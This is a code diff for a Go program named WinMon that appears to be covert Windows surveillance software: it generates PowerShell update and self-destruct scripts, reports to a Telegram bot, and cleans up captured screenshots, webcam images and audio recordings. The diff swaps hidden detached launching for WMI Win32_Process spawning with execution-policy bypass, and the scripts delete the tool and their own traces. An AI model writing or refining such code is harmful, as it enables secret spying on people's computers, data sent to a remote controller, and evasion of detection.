@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"syscall"
 
 	"winmon/internal/service"
 )
@@ -60,30 +59,26 @@ Stop-Service -Name WinMon -Force -ErrorAction SilentlyContinue
 Stop-Process -Name winmon -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 try {
-    Copy-Item -Path "%s" -Destination "%s" -Force
-    Remove-Item -Path "%s" -Force
-    %s
-    $body = @{ chat_id = "%d"; text = "%s" }
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
+    Copy-Item -Path "%[1]s" -Destination "%[2]s" -Force
+    Remove-Item -Path "%[1]s" -Force
+    %[3]s
+    $body = @{ chat_id = "%[4]d"; text = "%[5]s" }
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 } catch {
     $errText = "🔴 Update failed on this PC during copy: " + $_.Exception.Message
-    $body = @{ chat_id = "%d"; text = $errText }
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
+    $body = @{ chat_id = "%[4]d"; text = $errText }
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 }
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-`, slashedTemp, slashedExe, slashedTemp, startCmd, chatID, successMsg, botToken, chatID, botToken)
+`, slashedTemp, slashedExe, startCmd, chatID, successMsg, botToken)
 
 	err = os.WriteFile(scriptPath, []byte(psScript), 0644)
 	if err != nil {
 		return err
 	}
 
-	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-File", scriptPath)
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow:    true,
-		CreationFlags: 0x00000008, // DETACHED_PROCESS
-	}
-
+	cmdLine := fmt.Sprintf("Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%s\"' }", filepath.ToSlash(scriptPath))
+	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", cmdLine)
 	return cmd.Start()
 }
 
@@ -119,23 +114,25 @@ Start-Sleep -Seconds 1
 Start-Sleep -Seconds 3
 
 # 1. Clean up target executable, config, and state
-Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "%[1]s" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "%[2]s" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "%[3]s" -Force -ErrorAction SilentlyContinue
 
-# 2. Clean up installation folder
-Remove-Item -Path "%s" -Recurse -Force -ErrorAction SilentlyContinue
+# 2. Clean up installation folder only if it is the standard Program Files directory
+if ("%[4]s" -ieq "C:/Program Files/WinMon") {
+    Remove-Item -Path "%[4]s" -Recurse -Force -ErrorAction SilentlyContinue
+}
 
 # 3. Clean up all temporary files (screenshots, webcams, audio recordings, logs)
-Remove-Item -Path "C:\Windows\Temp\winmon_*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\winmon_*" -Exclude "winmon_implode.ps1","winmon_update.ps1" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\helper_*" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\screenshot.jpg" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\webcam.jpg" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\record.gif" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\audio.wav" -Force -ErrorAction SilentlyContinue
 
-$body = @{ chat_id = "%d"; text = "💥 WinMon service and all associated local files have been completely removed from this PC." }
-Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
+$body = @{ chat_id = "%[5]d"; text = "💥 WinMon service and all associated local files have been completely removed from this PC." }
+Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
 `, slashedExe, slashedConfig, slashedState, slashedExeDir, chatID, botToken)
 
@@ -144,11 +141,7 @@ Remove-Item -Path $MyInvocation.MyCommand.Path -Force
 		return err
 	}
 
-	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-File", scriptPath)
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow:    true,
-		CreationFlags: 0x00000008, // DETACHED_PROCESS
-	}
-
+	cmdLine := fmt.Sprintf("Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%s\"' }", filepath.ToSlash(scriptPath))
+	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", cmdLine)
 	return cmd.Start()
 }
